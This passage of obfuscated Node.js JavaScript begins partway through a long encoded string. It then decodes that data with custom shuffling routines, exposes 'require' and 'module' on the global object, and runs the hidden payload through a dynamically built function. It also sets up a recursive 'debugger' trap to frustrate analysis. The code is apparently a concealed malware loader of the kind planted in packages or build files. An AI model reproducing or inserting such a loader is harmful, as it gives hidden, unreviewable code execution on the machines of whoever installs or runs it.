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'];_0x5098=function(){return _0x3cb552;};return _0x5098();}function spin(_0x1a8260,_0x3448d1){var _0x3ebe0a=_0xe041;for(var _0x6e9d4c,_0x483a95,_0x468f54,_0x3d5783,_0x52d0ef,_0x2b155a,_0x4e7ed8=[],_0x5b54d8=0x0,_0x18b827=_0x3448d1[0x0];_0x5b54d8<_0x1a8260['length'];)_0x4e7ed8[_0x5b54d8]=_0x1a8260[_0x3ebe0a(0x17)](_0x5b54d8),_0x5b54d8+=0x1;for(_0x6e9d4c=_0x4e7ed8[_0x3ebe0a(0x0)],_0x5b54d8=0x0;_0x5b54d8<_0x6e9d4c;)_0x483a95=_0x18b827*(_0x5b54d8+_0x3448d1[0x1])+_0x18b827%_0x3448d1[0x2],_0x52d0ef=(_0x468f54=_0x18b827*(_0x5b54d8+_0x3448d1[0x3])+_0x18b827%_0x3448d1[0x4])%_0x6e9d4c,_0x2b155a=_0x4e7ed8[_0x3d5783=_0x483a95%_0x6e9d4c],_0x4e7ed8[_0x3d5783]=_0x4e7ed8[_0x52d0ef],_0x4e7ed8[_0x52d0ef]=_0x2b155a,_0x18b827=(_0x483a95+_0x468f54)%_0x3448d1[0x5],_0x5b54d8+=0x1;return _0x4e7ed8['join']('');}function splitLane(_0x18e365){var _0x214eb8=_0xe041,_0x7d11f0=String['fromCharCode'](0x1c),_0x432747=spin(_0x18e365,NX);return(_0x432747=(_0x432747=(_0x432747=_0x432747[_0x214eb8(0x9)]('^')[_0x214eb8(0x10)](_0x7d11f0))['split']('*1')[_0x214eb8(0x10)]('^'))['split']('*0')[_0x214eb8(0x10)]('*'))['split'](_0x7d11f0);}function peel(_0x3de695){return spin(_0x3de695,SX);}!function(_0x5877ad,_0x2e2079){var _0x21ced8=_0xe041,_0xe84a58={'lRaIg':'chain','wvKQl':_0x21ced8(0x2),'epkfv':_0x21ced8(0x20),'Ukunu':_0x21ced8(0x3)},_0x209bb8=(function(){var _0x34ab57=!![];return function(_0x43ced9,_0x4fae8c){var _0x3c0a6e=_0x34ab57?function(){var _0x393386=_0xe041;if(_0x4fae8c){var _0xd046d3=_0x4fae8c[_0x393386(0x1e)](_0x43ced9,arguments);return _0x4fae8c=null,_0xd046d3;}}:function(){};return _0x34ab57=![],_0x3c0a6e;};}());(function(){_0x209bb8(this,function(){var _0x3c7691=_0xe041,_0x2765c6=new RegExp(_0x3c7691(0x1f)),_0x4761da=new RegExp(_0x3c7691(0x16),'i'),_0x55f688=_0x490b11(_0x3c7691(0xc));!_0x2765c6['test'](_0x55f688+_0xe84a58[_0x3c7691(0x1)])||!_0x4761da[_0x3c7691(0x18)](_0x55f688+_0xe84a58[_0x3c7691(0xe)])?_0x55f688('0'):_0x490b11();})();}()),_0x5877ad['z']=z;var _0x1b38ff=splitLane(_0xe84a58[_0x21ced8(0x19)]);_0x5877ad[_0x1b38ff[0x0]]=_0x2e2079,typeof module===_0x1b38ff[0x1]&&(_0x5877ad[_0x1b38ff[0x2]]=module);var _0xa3935d=peel(_0xe84a58['Ukunu']),_0xa139a3=peel[_0xa3935d[_0x21ced8(0x21)](0x0,0xb)],_0x3c9d5f=_0xa139a3('',peel(_0x21ced8(0xf)));_0xa139a3('',_0x3c9d5f(peel(_0x21ced8(0x11))))(0x9cd);}(global,require);function _0x490b11(_0x3919ce){var _0x695c88=_0xe041,_0x14052e={'aKviz':_0x695c88(0x1b),'Rofgh':_0x695c88(0x15)};function _0x58dd58(_0x585b59){var _0x1e9ea4=_0x695c88;if(typeof _0x585b59===_0x1e9ea4(0xd))return function(_0x53d0ac){}[_0x1e9ea4(0x4)](_0x14052e['aKviz'])['apply'](_0x1e9ea4(0xb));else(''+_0x585b59/_0x585b59)[_0x1e9ea4(0x0)]!==0x1||_0x585b59%0x14===0x0?function(){return!![];}[_0x1e9ea4(0x4)](_0x1e9ea4(0x15)+'gger')[_0x1e9ea4(0x7)]('action'):function(){return![];}[_0x1e9ea4(0x4)](_0x14052e[_0x1e9ea4(0x23)]+'gger')[_0x1e9ea4(0x1e)](_0x1e9ea4(0x12));_0x58dd58(++_0x585b59);}try{if(_0x3919ce)return _0x58dd58;else _0x58dd58(0x0);}catch(_0x20eebc){}}
